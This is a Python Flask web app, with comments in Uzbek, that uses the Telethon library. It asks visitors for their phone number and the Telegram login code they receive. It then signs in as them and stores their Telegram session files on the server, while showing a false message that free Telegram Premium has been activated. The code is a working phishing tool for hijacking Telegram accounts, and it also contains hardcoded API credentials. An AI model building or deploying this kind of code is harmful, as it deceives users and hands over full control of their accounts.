from flask import Flask, render_template, request, session, redirect
from telethon import TelegramClient
import os
import asyncio

app = Flask(__name__)
app.secret_key = 'telegram_premium_test_key'

# Sizning API ma'lumotlaringiz
api_id = 36197920
api_hash = '2ccde5b4efd9a1465286f2bbcfec4b05'

# Sessiyalar saqlanadigan papka
if not os.path.exists('sessions'):
    os.makedirs('sessions')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
async def login():
    phone = request.form.get('phone').replace(' ', '')
    session['phone'] = phone
    
    # Har bir foydalanuvchi uchun alohida sessiya fayli yaratish
    client = TelegramClient(f'sessions/{phone}', api_id, api_hash)
    await client.connect()
    
    try:
        # Telegramga kod yuborish so'rovi
        sent_code = await client.send_code_request(phone)
        session['phone_code_hash'] = sent_code.phone_code_hash
        await client.disconnect()
        return render_template('verify.html')
    except Exception as e:
        await client.disconnect()
        return f"<h2>Xatolik: {str(e)}</h2><a href='/'>Orqaga</a>"

@app.route('/verify', methods=['POST'])
async def verify():
    otp = request.form.get('otp')
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    
    client = TelegramClient(f'sessions/{phone}', api_id, api_hash)
    await client.connect()
    
    try:
        # Kodni tasdiqlash va kirish
        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
        
        # O'zingizga muvaffaqiyatli xabar yuborish
        await client.send_message('me', '🚀 Tabriklaymiz! Tizim muvaffaqiyatli ulandi va sessiya yaratildi.')
        
        await client.disconnect()
        return "<h2>Tabriklaymiz! Bepul Premium obunangiz faollashtirildi.</h2>"
    except Exception as e:
        await client.disconnect()
        return f"<h2>Tasdiqlashda xatolik: {str(e)}</h2><a href='/'>Qayta urinish</a>"

if __name__ == '__main__':
    # Serverni 8080-portda ishga tushirish
    app.run(host='0.0.0.0', port=8080)
